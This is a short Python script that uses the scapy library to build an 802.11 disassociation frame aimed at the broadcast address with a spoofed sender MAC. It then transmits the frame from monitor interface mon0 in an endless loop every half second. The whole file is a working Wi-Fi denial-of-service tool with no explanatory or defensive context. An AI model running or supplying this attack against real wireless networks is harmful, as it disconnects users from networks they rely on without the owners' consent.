#!/usr/bin/python
import sys
from scapy.all import *
dis = RadioTap()/Dot11(type=0,subtype=10,addr1="ff:ff:ff:ff:ff:ff",addr2="00:02:03:04:05:07")
conf.iface="mon0"
#send(dis)
sendp(dis,inter=.5,loop=1)